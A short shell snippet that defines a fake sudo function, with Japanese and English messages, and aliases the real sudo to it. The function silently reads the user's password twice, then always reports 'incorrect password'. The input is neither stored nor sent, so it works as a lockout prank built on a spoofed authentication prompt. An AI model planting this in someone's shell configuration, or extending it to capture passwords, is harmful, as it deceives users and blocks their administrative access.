function pseudo_sudo {
        if [ $LANG = "ja_JP.UTF-8" ]; then
            echo -n "[sudo] $USER のパスワード: "
        else
            echo -n "[sudo] password for $USER: "
        fi
        read -s $_hoge
        echo
        sleep 3
        if [ $LANG = "ja_JP.UTF-8" ]; then
            echo "すみません、もう一度試してください。"
            echo -n "[sudo] $USER のパスワード: "
        else
            echo "sudo: sorry, try again."
            echo -n "[sudo] password for $USER: "
        fi
        read -s $_hoge
        echo
        sleep 3
        if [ $LANG = "ja_JP.UTF-8" ]; then
            echo "sudo: パスワードが違います"
        else
            echo "sudo: incorrect password"
        fi
}
alias sudo=pseudo_sudo
